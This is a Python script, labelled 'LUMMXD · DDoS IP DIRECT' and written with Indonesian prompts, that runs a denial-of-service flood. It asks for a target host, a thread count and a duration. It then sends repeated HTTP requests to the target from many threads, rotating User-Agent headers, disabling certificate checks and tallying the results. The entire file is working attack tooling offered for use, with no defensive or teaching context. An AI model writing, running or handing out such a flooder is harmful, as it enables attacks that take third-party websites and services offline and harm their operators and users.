#!/usr/bin/env python3
import time, threading, random, socket
import requests
from colorama import Fore, init
init(autoreset=True)

print(Fore.YELLOW + "╔═══════════════════════════════════╗")
print(Fore.YELLOW + "║   LUMMXD · DDoS IP DIRECT        ║")
print(Fore.YELLOW + "╚═══════════════════════════════════╝")

target = input(Fore.CYAN + "Masukkan IP atau domain : " + Fore.WHITE)
if not target.startswith("http"):
    target = "http://" + target

threads = int(input(Fore.CYAN + "Jumlah thread (contoh: 100) : " + Fore.WHITE) or 50)
durasi = int(input(Fore.CYAN + "Durasi (detik) : " + Fore.WHITE) or 30)

# Resolve IP
try:
    domain = target.split("//")[1].split("/")[0].split(":")[0]
    ip = socket.gethostbyname(domain)
    print(Fore.GREEN + f"[+] IP target : {ip}")
except:
    ip = "tidak diketahui"
    print(Fore.RED + "[!] Gagal resolve IP")

total = 0
sukses = 0
gagal = 0
running = True
lock = threading.Lock()

def serang():
    global total, sukses, gagal
    s = requests.Session()
    s.verify = False
    ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/92.0"
    ]
    while running:
        try:
            time.sleep(random.uniform(0.01, 0.12))
            h = {"User-Agent": random.choice(ua), "Cache-Control": "no-cache"}
            r = s.get(target, headers=h, timeout=3)
            with lock:
                total += 1
                if r.status_code < 400:
                    sukses += 1
                else:
                    gagal += 1
        except:
            with lock:
                total += 1
                gagal += 1

print(Fore.YELLOW + f"\n[+] Menyerang {target} (IP: {ip}) dengan {threads} thread...")
print(Fore.RED + "[!] Tekan Ctrl+C untuk stop\n")

for _ in range(threads):
    threading.Thread(target=serang, daemon=True).start()

mulai = time.time()
while running:
    time.sleep(1)
    elapsed = int(time.time() - mulai)
    if elapsed >= durasi:
        running = False
        break
    with lock:
        t, s, f = total, sukses, gagal
    print(f"\r⏱ {elapsed}s | ✓ {s} | ✗ {f} | ∑ {t}  ", end="")

print("\n\n" + "="*40)
print(Fore.GREEN + "=== LAPORAN ===")
print(f"Target : {target}")
print(f"IP     : {ip}")
print(f"Total  : {total}")
print(f"Sukses : {sukses}")
print(f"Gagal  : {gagal}")
print("="*40)
print(Fore.CYAN + "LummXDProject siap perintah selanjutnya, bos-tuan besar!")
